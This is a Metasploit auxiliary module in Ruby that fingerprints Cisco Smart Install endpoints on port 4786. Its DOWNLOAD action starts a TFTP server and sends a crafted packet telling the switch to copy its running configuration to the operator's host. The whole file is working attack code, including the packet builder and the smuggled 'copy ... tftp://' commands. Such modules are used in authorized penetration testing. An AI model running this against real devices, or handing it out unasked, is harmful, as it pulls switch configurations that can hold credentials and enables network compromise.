##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Identify Cisco Smart Install endpoints',
        'Description'    => %q(
          This module attempts to connect to the specified Cisco Smart Install port
          and determines if it speaks the Smart Install Protocol.  Exposure of SMI
          to untrusted networks can allow complete compromise of the switch.
        ),
        'Author'         => 'Jon Hart <jon_hart[at]rapid7.com>',
        'References'     =>
          [
            ['URL', 'https://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],
            ['URL', 'https://blogs.cisco.com/security/cisco-psirt-mitigating-and-detecting-potential-abuse-of-cisco-smart-install-feature'],
            ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityResponse/cisco-sr-20170214-smi'],
            ['URL', 'https://github.com/Cisco-Talos/smi_check'],
            ['URL', 'https://github.com/Sab0tag3d/SIET']

          ],
        'License'        => MSF_LICENSE,
        'DefaultAction' => 'SCAN',
        'Actions' => [
          ['SCAN', {'Description' => 'Scan for instances communicating via Smart Install Protocol (default)'}],
          ['DOWNLOAD', {'Description' => 'Retrieve configuration via Smart Install Protocol'}]
        ],
      )
    )

    register_options(
      [
        Opt::RPORT(4786),
        OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
        OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 60]),
        OptInt.new('DELAY', [ true, "Time to wait till requesting config to prevent service from becomming unresponsive.", 30])
      ]
    )
  end

  def start_tftp
    print_status("Starting TFTP Server...")
    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
    @tftp.start
    add_socket(@tftp.sock)

    @main_thread = ::Thread.current
  end

  def cleanup
    # Cleanup is called once for every single thread
    if ::Thread.current == @main_thread
      # Wait 5 seconds for background transfers to complete
      print_status("Providing some time for transfers to complete...")
      ::IO.select(nil, nil, nil, 5.0)

      print_status("Shutting down the TFTP service...")
      if @tftp
        @tftp.close rescue nil
        @tftp = nil
      end
    end
  end

  #
  # Callback for incoming files
  #
  def process_incoming(info)
    return if not info[:file]
    name = info[:file][:name]
    data = info[:file][:data]
    from = info[:from]
    return if not (name and data)

    # Trim off IPv6 mapped IPv4 if necessary
    from = from[0].dup
    from.gsub!('::ffff:', '')

    print_status("Incoming file from #{from} - #{name} #{data.length} bytes")
    cisco_ios_config_eater(from, 4786, data)
  end

  def decode_hex(string)
    string.scan(/../).map { |x| x.hex }.pack('c*')
  end

  def craft_packet
    config_name = "#{Rex::Text.rand_text_alpha(8)}.conf"
    copy_config = "copy system:running-config flash:/#{config_name}"
    transfer_config = "copy flash:/#{config_name} tftp://#{@lhost}/#{config_name}"
    packet_header = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'
    packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (transfer_config + decode_hex(('00' * (336 - transfer_config.length)))) + (decode_hex(('00' * 336)))
    return packet
  end


  # thanks to https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py#L52-L53
  SMI_PROBE = "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00".freeze
  SMI_RE = /^\x00{3}\x04\x00{7}\x03\x00{3}\x08\x00{3}\x01\x00{4}$/
  def smi?
    sock.puts(SMI_PROBE)
    response = sock.get_once(-1)
    if response
      if SMI_RE.match?(response)
        print_good("Fingerprinted the Cisco Smart Install protocol")
        return true
      else
        vprint_status("No match for '#{response}'")
      end
    else
      vprint_status("No response")
    end
  end

  def run_host(ip)
    @lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)
    begin
      case
        when action.name == 'SCAN'
          connect
          return unless smi?
        when action.name == 'DOWNLOAD'
          start_tftp
          connect
          return unless smi?
          print_status("Waiting #{datastore['DELAY']} seconds before requesting config")
          Rex.sleep(datastore['DELAY']) # reasnoning behind this, on some IOS versions, including my testbed, it becomes unresponsive after SMI
          packet = craft_packet
          print_status("Requesting configuration from device...")
          print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
          sock.put(packet)
          Rex.sleep(datastore['SLEEP'])
      end
    rescue Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, \
           ::Errno::ETIMEDOUT, ::Timeout::Error, ::EOFError => e
      vprint_error("error while connecting and negotiating Cisco Smart Install: #{e}")
      return
    ensure
      disconnect
    end

    service = report_service(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'Smart Install'
    )

    report_vuln(
      host: rhost,
      service: service,
      name: name,
      info: "Fingerprinted the Cisco Smart Install Protocol",
      refs: references,
      exploited_at: Time.now.utc
    )
  end
end
